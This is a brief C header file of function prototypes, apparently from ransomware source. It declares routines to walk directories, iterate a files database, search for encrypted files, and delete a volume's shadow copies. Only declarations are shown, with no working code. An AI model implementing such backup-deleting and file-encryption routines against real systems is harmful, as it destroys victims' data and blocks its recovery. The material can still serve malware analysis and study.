#pragma once

//here are functions proto's for file searching

void delShadows();  //Deletes shadow copies of the volume
int rWalking(const wchar_t *dirName, const bool ifBase);
bool checkDir(const wchar_t *dirName);
void writeCurPath();
void iterateFilesDB(BOOL action);
void searchForEncryptedFiles(const wchar_t *dirName, const bool ifBase);